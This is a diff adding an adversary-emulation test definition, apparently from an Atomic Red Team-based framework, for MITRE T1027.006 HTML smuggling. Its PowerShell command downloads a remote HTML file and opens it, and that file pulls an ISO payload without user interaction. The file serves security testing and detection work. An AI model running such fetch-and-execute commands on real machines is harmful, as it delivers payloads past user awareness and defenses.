@@ -1,0 +1,21 @@
+- description: "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso)\
+    \ without userinteraction. \nThe HTML file is based off of the work from [Stan\
+    \ Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n"
+  id: 6a8261d005f99ebd1de200d3cb11cef5
+  name: HTML Smuggling Remote Payload
+  platforms:
+    windows:
+      psh:
+        cleanup: $user = [System.Environment]::UserName; Remove-Item -Path C:\Users\$user\Downloads\FeelTheBurn.iso
+        command: if (Test-Path PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html)
+          { ; } else {New-Item -Type Directory "PathToAtomicsFolder\T1027.006\bin\"
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html"
+          -OutFile "PathToAtomicsFolder\T1027.006\bin\T1027_006_Remote.html"};  ;  PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027.006
+    name: HTML Smuggling
